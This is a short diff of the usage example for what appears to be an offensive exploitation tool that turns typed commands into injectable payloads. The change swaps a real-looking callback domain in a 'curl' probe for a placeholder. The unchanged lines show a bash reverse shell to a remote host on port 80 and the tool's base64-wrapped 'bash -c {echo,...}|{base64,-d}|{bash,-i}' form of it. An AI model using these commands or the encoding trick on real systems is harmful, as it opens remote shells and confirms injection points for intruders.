@@ -39,8 +39,8 @@
 [*] command example: curl dnslog.xx.com
 [*] if need base64 command, input should startwith bash=/powershell=/python=/perl= 
 [-] please enter command, input q or quit to quit
-> curl json.msvlch.wyzxxz.cn
-[-] start process command: curl json.msvlch.wyzxxz.cn
+> curl json.dnslog.xx.cn
+[-] start process command: curl json.dnslog.xx.cn
 [-] please enter command, input q or quit to quit
 > bash=bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
 [-] start process command: bash -c {echo,YmFzaD1iYXNoIC1pID4mIC9kZXYvdGNwL3h4Lnh4Lnh4Lnh4LzgwIDA+JjE=}|{base64,-d}|{bash,-i}
